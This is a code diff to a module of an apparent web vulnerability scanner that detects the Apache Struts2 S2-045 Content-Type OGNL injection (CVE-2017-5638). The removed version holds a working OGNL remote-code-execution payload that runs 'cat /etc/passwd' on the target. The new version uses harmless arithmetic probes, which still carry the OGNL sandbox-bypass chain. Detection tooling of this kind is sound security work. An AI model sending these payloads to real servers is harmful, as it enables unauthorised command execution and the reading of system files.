@@ -1,88 +1,94 @@
 #!/usr/bin/env python3
-# coding: utf-8
+# -*- coding: utf-8 -*-
+"""Apache Struts2 Content-Type OGNL injection (S2-045, CVE-2017-5638)."""
 
-#-:-:-:-:-:-:-:-:-:-:-:-:#
-#    TIDoS Framework     #
-#-:-:-:-:-:-:-:-:-:-:-:-:#
+from __future__ import annotations
 
-#Author : @_tID
-#This module requires TIDoS Framework
-#https://github.com/0xInfection/TIDoS-Framework
+from urllib.parse import urljoin
 
+from core.methods import fileinj, inject
+from core.methods import modkit as kit
+from core.methods.print import pvln
 
-
-import re
-#import requests
-import time
-#from random import *
-import string
-from core.Core.colors import *
-from core.methods.tor import session
-from core.database.database_module import save_data
-from core.variables import database
-from core.methods.cache import targetname
-import inspect
-
-info = "This module detects the Apache Struts Shock vulnerability. (CVE-2017-5638)"
+info = ("Detects Apache Struts2 S2-045 (CVE-2017-5638): an OGNL expression in the Content-Type "
+        "header that multiplies two random numbers and writes the result into a response header and "
+        "into the body. Only the computed product counts (an echoed header never contains it); no "
+        "OS command is executed. PATH selects the action(s) to test (default: the target URL).")
 searchinfo = "Struts Shock Detector"
-properties = {}
+properties = {
+    "PATH": ["Comma-separated action path(s) or URL(s), e.g. /login.action (default: target URL)", ""],
+}
 
-def strutsshock0x00(web):
-	requests = session()
-	print(GR+' [*] Parsing strings...')
-	time.sleep(0.5)
-	print(GR+' [*] Configuring payloads...')
-	payload = "%{(#_='multipart/form-data')."
-	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
-	payload += "(#_memberAccess?"
-	payload += "(#_memberAccess=#dm):"
-	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
-	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
-	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
-	payload += "(#ognlUtil.getExcludedClasses().clear())."
-	payload += "(#context.setMemberAccess(#dm))))."
-	payload += "(#cmd='cat /etc/passwd')."
-	payload += "(#iswin=(@java.lang.System@getProperty('os.name').tolower().contains('win')))."
-	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
-	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
-	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
-	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
-	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
-	payload += "(#ros.flush())}"
-	print(O+' [!] Setting Content-Type Payload : '+C+payload)
-	headers = {'Content-Type': payload, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0'}
-	time.sleep(0.5)
-	print(O+' [*] Making no-verify request...')
-	time.sleep(1)
-	resp = requests.get(web, headers=headers, verify=False)
-	if re.search(r'*?:/bin/bash',resp.content,re.I) or ('root:x' in resp.content and 'daemon:x:' in resp.content):
-		print(G+' [+] Website Vulnerable to Apache Struts-Shock (CVE-2017-5638) ! ')
-		save_data(database, module, lvl1, lvl2, lvl3, name, "Website Vulnerable to Apache Struts-Shock (CVE-2017-5638)!")
-	else:
-		print(R+' [-] The website seems immune to Apache Struts-Shock...')
-		save_data(database, module, lvl1, lvl2, lvl3, name, "The website seems immune to Apache Struts-Shock.")
+HEADER = "X-Tid-Check"
+
+# multipart/form-data must be in the header for the Jakarta parser to be used
+HEADER_OGNL = (
+    "%{{(#_='multipart/form-data')."
+    "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
+    ".addHeader('{header}',{a}*{b}))}}"
+)
+BODY_OGNL = (
+    "%{{(#_='multipart/form-data')."
+    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+    "(#_memberAccess?(#_memberAccess=#dm):"
+    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+    "(#ognlUtil.getExcludedPackageNames().clear())."
+    "(#ognlUtil.getExcludedClasses().clear())."
+    "(#context.setMemberAccess(#dm))))."
+    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+    "(#ros.println('{m}'+({a}*{b})))."
+    "(#ros.flush())}}"
+)
+
+
+def targets(web) -> list[str]:
+    base = kit.url(web) + "/"
+    raw = kit.option(properties, "PATH", "Action path(s) to test, comma-separated (enter for the target)", "")
+    paths = [p.strip() for p in raw.split(",") if p.strip()] if raw else [kit.url(web)]
+    return list(dict.fromkeys(urljoin(base, p) if "://" not in p else p for p in paths))
+
+
+def probe(s, url: str) -> str:
+    a, b = fileinj.numbers()
+    try:
+        r = s.get(url, headers={"Content-Type": HEADER_OGNL.format(header=HEADER, a=a, b=b)},
+                  allow_redirects=False)
+    except Exception:
+        r = None
+    if r is not None and r.headers.get(HEADER, "").strip() == str(a * b):
+        return f"OGNL {a}*{b} in Content-Type -> response header {HEADER}: {a * b}"
+
+    a, b = fileinj.numbers()
+    m = inject.marker(5)
+    try:
+        r = s.get(url, headers={"Content-Type": BODY_OGNL.format(m=m, a=a, b=b)}, allow_redirects=False)
+    except Exception:
+        return ""
+    if f"{m}{a * b}" in fileinj.body(r):
+        return f"OGNL '{m}'+{a}*{b} in Content-Type -> '{m}{a * b}' in the response body"
+    return ""
+
 
 def strutsshock(web):
-	global name
-	name = targetname(web)
-	global lvl2
-	lvl2 = inspect.stack()[0][3]
-	global module
-	module = "VulnAnalysis"
-	global lvl1
-	lvl1 = "Critical Vulnerabilities"
-	global lvl3
-	lvl3 = ""
-	time.sleep(0.5)
-	#print(R+'\n    =======================================')
-	#print(R+'\n     A P A C H E   S T R U T S   S H O C K ')
-	#print(R+'    ---<>----<>----<>----<>----<>----<>----\n')
+    pvln("apache struts shock")
+    rec = kit.Recorder(web, kit.CRITICAL, "strutsshock")
+    s = kit.http(timeout=15)
+    hits = []
+    for url in targets(web):
+        kit.info(f"Testing {url}")
+        ev = probe(s, url)
+        if ev:
+            kit.found("Struts2 S2-045 / CVE-2017-5638 (confirmed)", url)
+            kit.bullet(ev)
+            hits.append(f"S2-045 / CVE-2017-5638 (confirmed): {url} -- {ev}")
+    if not hits:
+        kit.bad("Not vulnerable to Struts2 S2-045 (Content-Type OGNL).")
+        rec("Not vulnerable to Struts2 S2-045 (Content-Type OGNL).")
+    else:
+        rec(hits)
+    return hits
 
-	from core.methods.print import pvln
-	pvln("apache struts shock")
-	             
-	strutsshock0x00(web)
 
 def attack(web):
-	web = web.fullurl
-	strutsshock(web)
+    strutsshock(web)
